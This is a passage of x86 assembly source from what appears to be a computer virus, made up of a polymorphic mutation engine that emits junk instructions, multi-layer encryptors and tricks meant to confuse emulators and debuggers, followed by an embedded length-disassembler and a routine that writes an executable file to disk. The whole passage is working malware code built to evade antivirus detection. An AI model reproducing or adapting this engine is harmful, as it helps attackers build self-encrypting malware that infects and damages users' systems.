; now offset
        call    get_address
        stosd
        pop     eax
        cmp     al,3bh                  ; is a cmp
        je      make_jmp_after_cmp      ; if so force a compare
        ret

diff_movz:                              ; movsx,movzx,bt,btc,btr,bts,bswap
        call    get_random              ; 1 bit dim, 2 bit m/b
        mov     cl,al
        mov     dh,ah
        test    cl,1100000b
        jnz     no_wpf
        mov     al,066h
        stosb
no_wpf:
        mov     al,0fh
        stosb
        mov     al,0b6h
        shr     cl,1
        jc      some_bt
        shr     cl,1
        jc      zero_extend
        add     al,08h
zero_extend:
        shr     cl,1
        jc      dest_dw                 ; generate movsx/movzx on d or w
        inc     al
dest_dw:
        stosb
        call    get_random_al7
        mov     dl,al
        add     al,0c0h
        call    get_register
        shl     cl,3
        add     al,cl
        and     dh,011b
        pushf
        jnz     just_regs
        sub     al,0c0h-05h
        sub     al,dl
just_regs:
        stosb
        popf
        jnz     justret_r
        call    get_address
        stosd
justret_r:
        ret

some_bt:
        shr     cl,1
        jc      do_bswap
        add     al,04h                  ; btX second byte
        stosb
        and     cl,011000b
        add     cl,0e0h
        mov     al,cl
        call    get_register
        add     al,cl
        stosb
        shr     dh,1
        pushf                           ; make jmp after or not
        and     dh,01fh                 ; not much sense doing > 32
        mov     al,dh
        stosb
        popf
        jc      make_jmp_after_cmp
        ret

do_bswap:
        call    get_register
        mov     al,0c8h                 ; bswap
        add     al,cl
        stosb
        ret

mov_registers:
        call    get_random_al7          ; random source
        add     al,0c0h
        mov     ah,08bh
        call    get_register            ; useful dest
        shl     cl,3
        add     al,cl
        xchg    ah,al
        stosw
        jmp     g_dimension

maths_registers:
        call    get_random
        and     al,0111000b
        add     al,03h         ; base
        mov     ah,0c0h         ; suff
        push    eax

        call    get_register    ; dest
        shl     cl,03h
        add     ah,cl

        xchg    eax,ecx             ; save temp in ecx
        call    get_random_al7      ; all regs
        xchg    eax,ecx             ; reg in ECX and restore EAX

        add     ah,cl
        stosw

        call    g_dimension
        pop     eax
        cmp     al,3bh
        je      make_jmp_after_cmp
        ret

rotating_imms:
        call    get_random_al7
        cmp     al,0110b                ; 0f0 doesn't exist
        je      rotating_imms
        shl     al,3                    ; *8
        add     al,0c0h

        call    get_register
        add     al,cl
        mov     ah,0c1h
        xchg    al,ah
        stosw
        call    g_dimension
        xor     ecx,ecx
        inc     cl
        jmp     put_immediates

notneg_register:
        call    get_random
        shr     al,1
        mov     ax,0d0f7h
        jc      not_add
        add     ah,08h
not_add:
        call    get_register
        add     ah,cl
        stosw
;        jmp     g_dimension

g_dimension:
; EDI after generated garb
reget_dim:
        call    get_random_al7
        cmp     al,2
        jae     no_change
word_change:
        mov     ecx,dword ptr [edi-2]
        mov     byte ptr [edi-2],66h    ; the prefix
        mov     dword ptr [edi-1],ecx
        inc     edi
        mov     al,2
        jmp     post_no_change
no_change:
        mov     al,4
post_no_change:
        xchg    eax,ecx                 ; in ECX needed immediates
        ret

imm_assign:
        call    get_register
        mov     al,0b8h         ; base
        add     al,cl
        stosb
        inc     edi
        call    g_dimension
        dec     edi
;        jmp     put_immediates

put_immediates:
; cl how many
        call    get_random
put_imm_part:
        stosb
        shr     eax,8
        loop    put_imm_part
        ret

inc_dec_reg:
        call    get_random
        and     al,01000b               ; 0 or 8
        add     al,40h                  ; incdec generation
        call    get_register
        add     al,cl
        stosb
        inc     edi
        call    g_dimension
        dec     edi
        ret

xchg_regs:
        mov     al,087h                 ; xchg eax,eax
        call    get_register
        mov     ah,cl
        call    get_register
common_test_xchg:
        shl     cl,3
        add     ah,cl
        add     ah,0c0h
        stosw
        jmp     g_dimension

test_regs:
        call    get_random
        xchg    eax,ecx
        and     cx,0707h
        mov     ah,ch
        mov     al,085h                 ; test eax,eax
        jmp     common_test_xchg

temp_save_change:
        call    get_random_al7
        sub     al,6                    ; 1/4 probability, since this couldn't
        jc      skip_changer            ; come too often

        call    select_save
        jc      skip_changer

        push    ecx
        call    save_mov_xchg

        xchg    eax,ecx                 ; in al new register
        mov     al,byte ptr [edx]       ; imp_reg
        shl     al,3
        xchg    eax,ecx
        add     al,cl
        or      al,0c0h
        xchg    al,ah
        stosw                           ; mov important_reg,some_reg
        pop     ebx
        mov     byte ptr [r_used+ebp],bl    ; restore regs status
skip_changer:
        ret

select_save:
        call    get_random_al7
        sub     al,5                    ; get from 0 to 2
        jc      select_save

        xchg    eax,edx
        add     edx,offset r_pointer
        add     edx,ebp
        mov     al,byte ptr [edx]

        cmp     al,0ffh                 ; not already assigned?
        je      exit_bad

        cmp     al,20h                  ; no key signature, if so skip
        je      exit_bad

        call     is_used                 ; maybe is already saved on stack or
        jnz      return_good             ; such?
exit_bad:
        stc
        ret
return_good:
        mov     cl,byte ptr [r_used+ebp]
        clc
        ret

save_mov_xchg:
        xchg    eax,ebx
        call    get_register            ; get an usable register
        xchg    eax,ecx
        call    set_used                ; set this one as used
        call    unset_used              ; and the previous as unused
        mov     ah,087h                 ; xchg reg,reg base
        push    eax
        xor     ecx,ecx
        call    get_random              ; select if using mov or xchg
        shr     al,1
        jc      use_mov_first
        mov     cl,4                    ; + 4 becames mov reg,reg base
use_mov_first:
        shr     al,1                    ; when just saving this won't be used
        jc      use_mov_after           ; select whichone for restore aswell
        mov     ch,4
use_mov_after:
        pop     eax
        add     ah,ch                   ; restore one
        push    eax
        sub     ah,ch
        add     ah,cl
        shl     al,3                    ; * 8
        add     al,bl
        or      al,0c0h                 ; mov some_reg,important_reg
        xchg    al,ah
        stosw                           ; put the moving of regs
        call    rnd_garbage
        pop     eax
        ret

sets_misc:
        call    get_random              ; type of sel
        mov     al,0fh
        and     ah,al
        add     ah,090h
        call    get_register
        cmp     cl,3
        ja      cant_useset             ; won't retry, so not too many
        stosw
        bswap   eax                     ; rnd
        shr     al,1
        jc      docs_ones
        add     cl,08h                  ; has 2 set of ocodes
docs_ones:
        shr     al,1
        jc      low_ones
        add     cl,04h                  ; high or low 8
low_ones:
        mov     al,0c0h
        add     al,cl
        stosb
        ret

cant_useset:                            ; shld/shrd
        test    ah,110b                 ; last bit used later
        jnz     no_66p
        push    eax
        mov     al,066h                 ; with words
        stosb
        pop     eax
no_66p:
        shr     ah,1
        mov     ah,0a4h
        jc      do_shlld
        add     ah,0ch-04h              ; shrd
do_shlld:
        cmp     cl,7
        jne     noss_with_cl
        inc     ah                      ; with immediate cl
noss_with_cl:
        stosw
        call    get_random
        and     al,0111000b
        call    get_register
        add     al,cl
        add     al,0c0h                 ; in ah we have rnd sh nr
        stosb
        test    byte ptr [edi-2],01b    ;was using cl?
        jnz     wasnt_with_cl
        dec     edi
        stosw
wasnt_with_cl:
        ret

xadd_cmpxchg:
        call    get_random
        and     ah,10h          ; 10h or 00h
        jc      np_nchk
        test    byte ptr [ebp+r_used],01b      ; is ax used?
        jnz     home_xx         ; if so no cmpxchg
np_nchk:
        test    al,110b
        jnz     no_66pr
        mov     al,66h
        stosb
no_66pr:
        add     ah,0b1h
        cmp     byte ptr [edi-1],066h
        je      cant_byterize
        and     al,1
        sub     ah,al           ; cmpxchg or xadd with b or notb
cant_byterize:
        mov     al,0fh
        stosw
get_reg1:
        call    get_register
        mov     ch,cl
get_reg2:
        call    get_register
        mov     al,0c0h
        test    byte ptr [edi-1],01b     ; was using bytes?
        jnz     no_byteprob
        cmp     ch,3                    ; if bytes must be <= 3
        ja      get_reg1
        cmp     cl,3
        ja      get_reg2
        push    eax
        bswap   eax                     ; high part of rnd
        and     ax,010000000100b        ; random +4 on both src and dest
        add     cx,ax
        pop     eax
no_byteprob:
        shl     cl,3
        add     al,cl
        add     al,ch
        stosb
home_xx:
        ret

emu_stuffy:                     ; some stuff to try to fool emus
        call    get_random
        and     al,011111b       ; not too often
        jnz     keep_few_ae

        lea     edx,[ebp + offset t_pushed]

        shr     ah,1
        jc      regs_checking

        shr     ah,1
        jc      xlat_generation

stack_checking:
        ; check if stack seems consistent or not
        mov     al,68h          ; push immediate opcode
        stosb
        call    get_random
        stosd
        push    eax
        xor     ch,ch           ; nr of dword on stack
        xchg    ch,byte ptr [edx]     ; don't smash our stack
        call    rnd_garbage
        call    get_register
        mov     al,cl
        call    set_used
        mov     bl,al
        add     al,058h         ; pop opcode
        stosb
        mov     byte ptr [edx],ch      ; can work on stack again
        call    rnd_garbage
        call    unset_used

typepopchk:
        call    get_random
        shr     al,1
        jnc     check_posones
        and     ah,100000b      ; add/and reg32, not/neg imm
        jnz     just_not_atesp
        dec     dword ptr [esp] ; since add needs the neg value
just_not_atesp:
        not     dword ptr [esp]       ; the imm
        add     ah,0c0h
        jmp     chksta_st
check_posones:
        and     ah,011000b
        jz      typepopchk
        add     ah,0e0h
chksta_st:
        mov     al,81h          ; cmp/sub/xor reg32,imm
        add     ah,bl
        stosw
        pop     eax             ; value to check with
        stosd
check_okequ:
        mov     bx,07574h
        jmp     do_jumpzh


regs_checking:
        shr     ah,1
        jc      ss_play

        shr     ah,1
        jc      mem_write

        ; ones just checking our regs (pointer and counter) consistency
        ; compare with zero in various ways and jump at the right code if !=
        cmp     dword ptr [edx - (offset t_pushed - offset w_loopbg)],00h
                                                         ; not in the loop
        jne     keep_few_ae

        bswap   eax
        and     eax,01b       ; 0 or 1
        add     eax,ebp
        add     eax,offset r_pointer    ; so will be r_pointer or r_counter
        mov     al,byte ptr [eax]
        inc     al              ; already initialized ?
        jz      keep_few_ae
        dec     al
        call    is_used         ; check that we aren't in moving thingy
        jz      keep_few_ae
reran_h:
        call    get_random_al7  ; type of cmp
        cmp     al,5
        jae     or_oring        ; do or reg,reg

        lea     ebx,[edx - (offset t_pushed - offset chk_counter)]
        add     ebx,eax         ; which one
        mov     ah,byte ptr [ebx]
        mov     al,83h
        add     ah,cl
        stosw
        xor     al,al
        stosb                   ; with a zero
        jmp     do_jumpzh_reg

or_oring:
        mov     ax,0c00bh       ; or eax,eax base
        add     ah,cl           ; have in cl the reg
        shl     cl,3
        add     ah,cl           ; both src and dest
        stosw
do_jumpzh_reg:
        mov     bx,07475h
; JZ and JNZ creation (considering BH is okay, while BL makes shit)
do_jumpzh:
        call    get_random
        shr     al,1            ; do jz or jnz ?
        jnc     do_jz_easily
                                ; else we have to do a construction with
                                ; more sense
        mov     al,bl
        stosw
too_long_redo:
        push    dword ptr [edx]        ; save stack situation
        mov     ebx,edi         ; jmp offset +1
        call    rnd_garbage
        call    get_random      ; random byte to break execution or ret
        shr     ah,1
        jc      no_jmpback      ; do a long jmp back to hide the loop one
        mov     al,0e9h
        stosb
        or      ax,0ffffh       ; not too long
        bswap   eax
        or      ah,0f8h
        stosd
        jmp     comehome
no_jmpback:
        shr     ah,1
        jnc     rndbyteuse
        mov     al,0c3h         ; a ret is quite polite for the emu :)
rndbyteuse:
        stosb
comehome:
        call    rnd_garbage
        pop     dword ptr [edx]
        mov     eax,edi
        sub     eax,ebx
        cmp     eax,07fh        ; see it is not too long for a short jmp
        jbe     oki_lenght
        mov     edi,ebx         ; else retry
        jmp     too_long_redo
oki_lenght:
        mov     byte ptr [ebx-1],al
        jmp     keep_few_ae
do_jz_easily:
        mov     al,bh         ; jz short to some random location
        stosw
keep_few_ae:
        ret

xlat_generation:                ; is xlat emulated? anyway, hc garbage :)
        shr     ah,1
        jnc     enter_generation

        test    byte ptr [edx - (offset t_pushed - offset r_used)],01001b
        jnz     keep_few_ae     ; are ebx and eax unused ?
        mov     al,0bbh         ; mov ebx
        stosb
        push    edx
        call    get_address     ; a decent mem addy
        stosd
        pop     edx             ; set ebx as used
        or      byte ptr [edx - (offset t_pushed - offset r_used)],01000b
        call    rnd_garbage     ; and then unset ebx as used
        and     byte ptr [edx - (offset t_pushed - offset r_used)],(NOT 1000b)
        mov     al,0d7h         ; xlat opcode
        stosb
        ret

enter_generation:                       ; some more funny garbage
        mov     al,0c8h         ; enter
        stosb
        bswap   eax
        and     al,0111100b     ; requested stack
        stosb
        xor     al,al
        stosb
        stosb
        xchg    al,byte ptr [edx]     ; don't smash our stack
        mov     ah,byte ptr [edx - (offset t_pushed - offset r_used)] ; no ebp
        or      byte ptr [edx - (offset t_pushed - offset r_used)],100000b
        call    rnd_garbage
        mov     byte ptr [edx],al
        mov     byte ptr [edx - (offset t_pushed - offset r_used)],ah
        mov     al,0c9h         ; leave
        stosb
        ret

ss_play:
        ; opcodes that modify SS (actually they don't change it, but will
        ; make life harder for debuggers and some emus hopefully)
        shr     ah,1
        jc      with_regs_ssplay
        ; first way, just push ss and then pop ss later
        mov     al,016h                 ; push
        stosb
        xor     ah,ah
        xchg    ah,byte ptr [edx]       ; don't smash our stack
        call    rnd_garbage
        xchg    ah,byte ptr [edx]
        inc     al                      ; pop
        stosb
        ret
with_regs_ssplay:
        ; mov reg,ss and later mov ss,reg
        and     ah,011b
        jnz     no_66pfss
        mov     al,066h                 ; is oky anyway
        stosb
no_66pfss:
        call    get_register
        mov     ax,0d08ch               ; mov reg,ss
        add     ah,cl
        stosw
        xchg    eax,ecx
        call    set_used                ; don't mess with that one
        call    rnd_garbage
        xchg    eax,ebx
        call    unset_used
        xchg    eax,ecx
        inc     al
        inc     al                      ; mov ss,reg
        stosw
        ret

mem_write:
        ; write a dd somewhere (back where we won't go :) ) and then check
        ; if the contents are the same after some garbage
        cmp     byte ptr [edx - (offset t_pushed - offset m_writes)],01h
                                                ; don't nest, could work
        je      exit_mw_r                       ; on same addy (should be)
                                                ; well we could even put this
                                                ; away :P
        inc     byte ptr [edx - (offset t_pushed - offset m_writes)]
        call    get_random              ; get a register
        and     ah,0111000b
        push    eax
        add     ah,05h
        mov     al,089h
        stosw
        mov     ecx,[edx - (offset t_pushed - offset t_inipnt)]
restart_memsearch:
        mov     ebx,[edx - (offset t_pushed - offset w_loopbg)]
        or      ebx,ebx                 ; not in the loop
        jnz     looping_alr
        cmp     byte ptr [edx - (offset t_pushed - offset t_inacall)],01h
                                        ; could overwrite ourslv
        jne     can_proceed_mw
bad_mem:
        pop     eax
        dec     edi
        dec     edi
exit_mw:
        dec     byte ptr [edx - (offset t_pushed - offset m_writes)]
exit_mw_r:
        ret
can_proceed_mw:
        mov     ebx,edi                 ; else can do from here down, anyway
                                        ; we won't return to it and we are
                                        ; sure that layers are not back
looping_alr:
        sub     ebx,4
        cmp     ebx,ecx                 ; is there at least a bit of place?
        jbe     bad_mem
        call    get_random
        and     eax,03ffh
        sub     ebx,eax
        sub     ebx,ecx
        jc      restart_memsearch
        add     ebx,[edx - (offset t_pushed - offset v_runnin)]
        mov     eax,ebx
        stosd

        call    get_random              ; check what was written or not?
        shr     al,1                    ; to make less visibile maybe ;)
        pop     eax                     ; the used reg
        jc      exit_mw
        xchg    al,ah
        shr     al,3
        call    is_used
        pushf
        call    set_used
        call    rnd_garbage
        popf
        push    ebx
        jnz     wasntusedb
        mov     ebx,eax                 ; if was used then nuthing, else
        call    unset_used              ; put reusable
wasntusedb:
        shl     al,3
        add     al,5
        mov     ah,03bh                 ; cmp reg, memval
        xchg    ah,al
        stosw
        pop     eax
        stosd                           ; the addy
        jmp     check_okequ

from_stack:                     ; read/write stuff from stack referencing
                                ; with esp quite often found in windoze code
        call    get_random      ; type of operation
        and     al,0fh
        cmp     al,8
        jae     make_mov
        shl     al,3
        inc     al
        jmp     selected_op
make_mov:
        mov     al,89h
selected_op:
        mov     ch,al
        bswap   eax
        mov     al,byte ptr [ebp + t_pushed]    ; 'our' dd on stack
        or      al,al
        jz      cant_write_anyway

        cmp     byte ptr [ebp + t_inacall],01h
        je      cant_write_anyway

        dec     al
        mov     cl,al

        call    get_random_al7
        cmp     al,cl
        ja      cant_write_anyway       ; don't retry, so less writes
        mov     ah,al
        jmp     prepare_all
cant_write_anyway:
        and     ah,0111b
        add     ch,02h
prepare_all:
        mov     al,ch
        stosb
        call    get_register
        shl     cl,3
        or      ah,ah
        jz      dont_addesp     ; just [esp], no + imm
        add     cl,40h
dont_addesp:
        add     cl,04h
        xchg    al,cl
        stosb
        mov     al,24h
        stosb
        or      ah,ah
        jz      no_immesp
        shl     ah,2            ; * 4, dword padded is always used
        mov     al,ah
        stosb
no_immesp:
        ret

; tables for various purposes
garbage_mask    equ     1fh
garbage_number  equ     14h

garbage_offsets:
        dd      offset  call_subroutines
        dd      offset  gen_one_byters
        dd      offset  mov_registers
        dd      offset  mem_assign
        dd      offset  mem_mathops
        dd      offset  maths_immediate
        dd      offset  maths_immediate_short
        dd      offset  maths_registers
        dd      offset  rotating_imms
        dd      offset  notneg_register
        dd      offset  imm_assign
        dd      offset  inc_dec_reg
        dd      offset  xchg_regs
        dd      offset  test_regs
        dd      offset  temp_save_change
        dd      offset  cdq_jmps_savestack
        dd      offset  diff_movz
        dd      offset  sets_misc
        dd      offset  xadd_cmpxchg
        dd      offset  emu_stuffy
        dd      offset  from_stack

one_byters      db      090h,0fch,0fdh,0f8h,0f9h,0f5h,070h,080h

change_jump     db      098h,099h,0ebh,0e9h

_math_imm:
        dw      008c1h  ; ror d[ebx],imm
        dw      02881h  ; sub d[ebx],imm
        dw      03081h  ; xor d[ebx],imm
        dw      00081h  ; add d[ebx],imm
        dw      000c1h  ; rol d[ebx],imm
_math_key:
        dw      008d3h  ; ror d[ebx],cl
        dw      00029h  ; sub d[ebx],eax
        dw      00031h  ; xor d[ebx],eax
        dw      00001h  ; add d[ebx],eax
        dw      000d3h  ; rol d[ebx],cl

; cmp,or,xor,sub,add
chk_counter     db      0f8h,0c8h
key_changers    db      0e8h,0f0h,0c0h  ; xor sub add
                db      0c0h,0c8h       ; ror rol
                db      0d0h            ; not
                db      040h,048h       ; inc dec

krappo_gen:
        call    get_random              ; generate krap bytes
        and     eax,01fh
        jz      exit_krappo
        xchg    eax,ecx
krap_stuffy:
        call    get_random
        stosb
        loop    krap_stuffy
exit_krappo:
        ret

get_random_al7:
        call    get_random
        and     eax,0111b
        ret

get_random:
        push    ebx
        push    edx

        db     0b8h                     ; mov eax,
seed    dd     000h                     ; random seed, must be < im
        mov     ebx,4096d                ; ia
        mul     ebx
        add     eax,150889d              ; ic
        adc     edx,0
        mov     ebx,714025d              ; im
        push    ebx
        div     ebx
        mov     dword ptr [seed+ebp],edx
        xchg    eax,edx
        cdq
        xor     ebx,ebx
        dec     ebx
        mul     ebx                     ; * 2^32 - 1
        pop     ebx
        div     ebx                     ; here we have a 0<=rnd<=2^32
        pop     edx
        pop     ebx
        ret

is_used:
; AL register
        push    eax
        mov     cl,al
        mov     al,1
        shl     al,cl
        test    byte ptr [r_used+ebp],al
        pop     eax
; Z  = register not used
; NZ = register used
        ret

set_used:
; AL register
        push    eax
        xor     ah,ah
        bts     word ptr [r_used+ebp],ax
        pop     eax
        ret

unset_used:
; BL register
        xor     bh,bh
        btr     word ptr [r_used+ebp],bx
        ret

get_register:
        push    eax
reget_reg:
        call    get_random_al7
        call    is_used
        jnz      reget_reg               ; check we aren't using it
; the is_used will put the reg in cl
        pop     eax
        ret

get_address:
        push    esi
        mov     ebx,edi
        lea     esi,[offset v_runnin + ebp]
                db      081h,0ebh       ; sub ebx,initial_edi
t_inipnt        dd      00h             ; so we have actualy dec lenght

        add     ebx,dword ptr [esi - (offset v_runnin - offset v_lenght)]
        mov     edx,dword ptr [esi]

                db      0b1h            ; mov cl,
t_memand        db      00h             ; significant bits present

        add     edx,ebx

search_offset2:
        call    get_random
        shl     eax,cl
        shr     eax,cl
        cmp     eax,dword ptr [esi]     ; is < starting off of poly?
        jb      search_offset2
look_foroff2:
        cmp     eax,edx                 ; upper border
        jbe     ok_offset2
        sub     eax,ebx
        jmp     look_foroff2
ok_offset2:
        pop     esi
        ret

; how much memory does the ETMS need, so you can substract from the lenght
; of the virus on file of course
_mem_space      =       (offset _mem_data_end - offset _mem_data_start)

; everything down there just in mem, don't save it in your file
_mem_data_start:

r_pointer       db      00h             ; register used as pointer
r_counter       db      00h             ; register used as counter
r_regkey        db      00h             ; register used as key, 20h use
                                        ; immediate as key
r_used          db      00000000b
;  bits meaning          0 0 0 1 0 0 0 0
;                        E E E E E E E E
;                        D S B S B D C A
;                        I I P P X X X X

t_chgpnt        db      00h             ; changes to be made to pointer
t_chgcnt        db      00h             ; changes to be made to counter
t_chgkey        db      00h             ; changes to be made to key register
t_chgmat        db      00h             ; changes to be made to operation
t_exitjmp       db      00h             ; 01 has to create exit jmp, 00h no
t_prejmp        db      00h             ; number of key changes b4 jmp
m_writes        db      00h             ; already written mem in a loop?
                ; ne stavit nic tukaj ali menjaj inicializacijo!
t_pntoff        dd      00h             ; offset added to pointer (00h if not
                                        ; added)
t_cntoff        dd      00h             ; constant to be added to counter
                                        ; value

t_fromend       db      00h             ; 00h from start, else from end
t_countback     db      00h             ; 01h decrementing, else incrementing

t_pushed        db      00h             ; pushed dwords
t_maxjmps       db      00h             ; max jumps
t_inacall       db      00h             ; into a call or not
                db      00h

v_lenght        dd      00h             ; lenght
v_virusp        dd      00h             ; pointer to body
v_runnin        dd      00h             ; offset at which dec will run

w_counter       dd      00h             ; where counter is assigned - 1
w_loopbg        dd      00h             ; where loop begins
w_encrypt       dd      00h             ; pointer on current pos in encryptor

orig_dx         dd      00h
t_chkpos        dd      00h             ; position of the checking jmp

l_space         equ (enc_max + 10h)
tl_space        equ (6 * l_space)
layer_end       dd      00h       ; last nr of layer * layer dim
layer_nr        dd      tl_space  ; number of layers (0-6) * layer dim

; data structures for all the layers
; first layer is the last in mem and so on...
enc_space:
                dd      00h             ; initial key
                dd      00h             ; counter
                dd      00h             ; initial pointer
                dd      00h             ; position of the pointer in dec
                db      enc_max dup (90h)       ; encryptor

                dd      4 dup (00h)
                db      enc_max dup (90h)

                dd      4 dup (00h)
                db      enc_max dup (90h)

                dd      4 dup (00h)
                db      enc_max dup (90h)

                dd      4 dup (00h)
                db      enc_max dup (90h)

                dd      4 dup (00h)
                db      enc_max dup (90h)

                dd      4 dup (00h)
                db      enc_max dup (90h)
_mem_data_end:



; LDE32BIN.INC -- Length-Disassembler Engine //32-bit
; 1.06
; generated file. do not edit
disasm_init:
db 060h,08Bh,07Ch,024h,024h,0FCh,033h,0C0h
db 050h,050h,050h,068h,000h,0A8h,0AAh,002h
db 068h,07Fh,068h,0FFh,03Fh,068h,0A0h,0DEh
db 0E6h,0FFh,068h,0FFh,0FFh,0D5h,0DBh,068h
db 0AAh,0AAh,0FEh,0FFh,068h,0AAh,0AAh,0AAh
db 0AAh,068h,000h,000h,0AAh,0AAh,050h,050h
db 050h,050h,050h,050h,068h,054h,001h,000h
db 000h,068h,055h,0F5h,0FFh,041h,068h,0AAh
db 0DDh,0DEh,055h,068h,011h,051h,095h,019h
db 068h,0FFh,01Fh,011h,011h,068h,0AAh,0FFh
db 011h,0FAh,068h,096h,0CFh,060h,08Eh,068h
db 0AAh,0D6h,072h,0FCh,068h,088h,0AAh,0AAh
db 0AAh,068h,0D5h,088h,088h,088h,068h,09Bh
db 055h,08Dh,052h,068h,053h,0D5h,06Ch,036h
db 068h,0FFh,055h,055h,035h,068h,0F9h,0D6h
db 0FEh,0FFh,068h,088h,088h,088h,068h,068h
db 088h,088h,088h,088h,068h,0CAh,047h,053h
db 08Dh,068h,0DFh,07Bh,0C6h,0DCh,068h,0AAh
db 0AAh,0AAh,0AAh,068h,0AAh,0AAh,0AAh,0AAh
db 068h,0FDh,04Fh,0A9h,0ABh,068h,0EAh,0FEh
db 0A7h,0D4h,068h,029h,075h,0FFh,053h,068h
db 0FEh,0A7h,0A4h,0FFh,068h,04Ah,0FAh,09Fh
db 092h,068h,0FFh,029h,0E9h,07Fh,0B9h,000h
db 002h,000h,000h,033h,0DBh,033h,0C0h,0E8h
db 014h,000h,000h,000h,0ABh,0E2h,0F6h,061h
db 0C3h,00Bh,0DBh,075h,007h,05Dh,05Eh,05Ah
db 056h,055h,0B3h,020h,04Bh,0D1h,0EAh,0C3h
db 0E8h,0ECh,0FFh,0FFh,0FFh,00Fh,083h,07Fh
db 000h,000h,000h,0E8h,0E1h,0FFh,0FFh,0FFh
db 073h,003h,0B4h,040h,0C3h,0E8h,0D7h,0FFh
db 0FFh,0FFh,072h,057h,0E8h,0D0h,0FFh,0FFh
db 0FFh,073h,04Dh,0E8h,0C9h,0FFh,0FFh,0FFh
db 073h,043h,0E8h,0C2h,0FFh,0FFh,0FFh,072h
db 025h,0E8h,0BBh,0FFh,0FFh,0FFh,073h,003h
db 0B0h,020h,0C3h,0E8h,0B1h,0FFh,0FFh,0FFh
db 073h,005h,066h,0B8h,002h,020h,0C3h,0E8h
db 0A5h,0FFh,0FFh,0FFh,073h,005h,066h,0B8h
db 008h,010h,0C3h,0B4h,003h,0C3h,0E8h,096h
db 0FFh,0FFh,0FFh,073h,003h,0B4h,060h,0C3h
db 0E8h,08Ch,0FFh,0FFh,0FFh,073h,003h,0B0h
db 018h,0C3h,0B4h,002h,0C3h,0B4h,080h,0C3h
db 0B4h,001h,0C3h,0E8h,079h,0FFh,0FFh,0FFh
db 073h,00Dh,0E8h,072h,0FFh,0FFh,0FFh,073h
db 003h,0B0h,008h,0C3h,0B4h,041h,0C3h,0B4h
db 020h,0C3h,0E8h,062h,0FFh,0FFh,0FFh,014h
db 000h,048h,0C3h
disasm_main:
db 060h,08Bh,074h,024h,024h,08Bh,04Ch,024h
db 028h,033h,0D2h,033h,0C0h,080h,0E2h,0F7h
db 08Ah,001h,041h,00Bh,014h,086h,0F6h,0C2h
db 008h,075h,0F2h,03Ch,0F6h,074h,036h,03Ch
db 0F7h,074h,032h,03Ch,0CDh,074h,03Bh,03Ch
db 00Fh,074h,044h,0F6h,0C6h,080h,075h,052h
db 0F6h,0C6h,040h,075h,073h,0F6h,0C2h,020h
db 075h,054h,0F6h,0C6h,020h,075h,05Ch,08Bh
db 0C1h,02Bh,044h,024h,028h,081h,0E2h,007h
db 007h,000h,000h,002h,0C2h,002h,0C6h,089h
db 044h,024h,01Ch,061h,0C3h,080h,0CEh,040h
db 0F6h,001h,038h,075h,0CEh,080h,0CEh,080h
db 0EBh,0C9h,080h,0CEh,001h,080h,039h,020h
db 075h,0C1h,080h,0CEh,004h,0EBh,0BCh,08Ah
db 001h,041h,00Bh,094h,086h,000h,004h,000h
db 000h,083h,0FAh,0FFh,075h,0ADh,08Bh,0C2h
db 0EBh,0CDh,080h,0F6h,020h,0A8h,001h,075h
db 0A7h,080h,0F6h,021h,0EBh,0A2h,080h,0F2h
db 002h,0F6h,0C2h,010h,075h,0A4h,080h,0F2h
db 006h,0EBh,09Fh,080h,0F6h,002h,0F6h,0C6h
db 010h,075h,09Ch,080h,0F6h,006h,0EBh,097h
db 08Ah,001h,041h,08Ah,0E0h,066h,025h,007h
db 0C0h,080h,0FCh,0C0h,00Fh,084h,07Bh,0FFh
db 0FFh,0FFh,0F6h,0C2h,010h,075h,02Dh,03Ch
db 004h,075h,005h,08Ah,001h,041h,024h,007h
db 080h,0FCh,040h,074h,017h,080h,0FCh,080h
db 074h,00Ah,066h,03Dh,005h,000h,00Fh,085h
db 059h,0FFh,0FFh,0FFh,080h,0CAh,004h,0E9h
db 051h,0FFh,0FFh,0FFh,080h,0CAh,001h,0E9h
db 049h,0FFh,0FFh,0FFh,066h,03Dh,006h,000h
db 074h,00Eh,080h,0FCh,040h,074h,0EDh,080h
db 0FCh,080h,00Fh,085h,035h,0FFh,0FFh,0FFh
db 080h,0CAh,002h,0E9h,02Dh,0FFh,0FFh,0FFh


drop_gen:
    ; edx - path
    push 0 edx
    call [ebp._lcreat]
    cmp eax, -1
    jz  __2
    xchg eax, ebx
    call __1
db  04Dh,05Ah,050h,000h,002h,000h,000h,000h,004h,000h,00Fh,000h,0FFh,0FFh
db  000h,000h,0B8h,000h,000h,000h,000h,000h,000h,000h,040h,000h,01Ah,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,001h,000h,000h,0BAh,010h,000h,00Eh,01Fh,0B4h
db  009h,0CDh,021h,0B8h,001h,04Ch,0CDh,021h,090h,090h,054h,068h,069h,073h
db  020h,070h,072h,06Fh,067h,072h,061h,06Dh,020h,06Dh,075h,073h,074h,020h
db  062h,065h,020h,072h,075h,06Eh,020h,075h,06Eh,064h,065h,072h,020h,057h
db  069h,06Eh,033h,032h,00Dh,00Ah,024h,037h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,050h,045h,000h,000h,04Ch,001h,003h,000h,04Fh,02Ch
db  047h,069h,000h,000h,000h,000h,000h,000h,000h,000h,0E0h,000h,08Fh,083h
db  00Bh,001h,002h,019h,000h,002h,000h,000h,000h,004h,000h,000h,000h,000h
db  000h,000h,000h,010h,000h,000h,000h,010h,000h,000h,000h,020h,000h,000h
db  000h,000h,040h,000h,000h,010h,000h,000h,000h,002h,000h,000h,001h,000h
db  000h,000h,000h,000h,000h,000h,003h,000h,00Ah,000h,000h,000h,000h,000h
db  000h,040h,000h,000h,000h,004h,000h,000h,000h,000h,000h,000h,002h,000h
